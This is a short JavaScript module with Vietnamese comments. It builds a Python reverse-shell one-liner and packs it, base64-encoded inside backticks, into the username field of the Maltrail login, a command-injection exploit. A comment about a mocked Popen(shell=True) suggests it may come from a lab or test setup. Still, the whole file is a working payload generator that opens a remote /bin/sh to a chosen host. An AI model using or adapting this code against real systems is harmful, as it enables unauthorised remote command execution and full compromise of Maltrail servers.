/**
 * Tạo payload Python reverse shell (một dòng), mã hóa base64 cho username injection Maltrail.
 */
function buildPythonReverseShell(host, port) {
  // Dùng -c "..." và nháy đơn trong Python để tránh vỡ quoting khi chạy qua echo|base64|sh
  return (
    `python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);` +
    `s.connect(('${host}',${port}));` +
    `os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);` +
    `pty.spawn('/bin/sh')"`
  );
}

/**
 * Giá trị tham số username (không gồm tiền tố username=): `echo B64 | base64 -d | sh`
 * (Với mock Popen(shell=True) không cần tiền tố `;` như khi ghép vào lệnh echo ... %s)
 */
function buildMaltrailUsernameField(host, port) {
  const py = buildPythonReverseShell(host, port);
  const b64 = Buffer.from(py, "utf8").toString("base64");
  return `\`echo ${b64} | base64 -d | sh\``;
}

module.exports = { buildPythonReverseShell, buildMaltrailUsernameField };
